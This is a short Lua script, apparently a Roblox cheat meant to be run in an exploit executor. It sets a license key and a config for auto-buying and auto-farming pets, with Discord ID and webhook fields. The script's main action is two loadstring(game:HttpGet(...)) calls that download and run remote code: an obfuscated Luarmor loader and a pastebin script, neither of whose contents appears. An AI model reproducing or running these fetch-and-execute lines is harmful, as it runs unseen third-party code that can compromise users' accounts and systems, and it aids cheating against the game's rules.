task.spawn(function()
    script_key = "CmkiyszPrFKpNoEkNbTAenQauykyEria"
    getgenv().Config = {
    ["PetAMountToBuy"] = "0", -- can be 999
    ["PetRemoteToBuy"] = "aztec_egg_2025_aztec_egg",

    ["PetFarmAutoSwitchFullGrown"] = false,
    ["PetFarmActive"] = false,
    ["LitePetFarmActive"] = true,
    ["EggFarmActive"] = false,
    
    ["HideUselessGui"] = true,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "123456",
    ["Webhook"] = "",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
end)
wait(10)
loadstring(game:HttpGet("https://pastebin.com/HyM0fBAA"))()
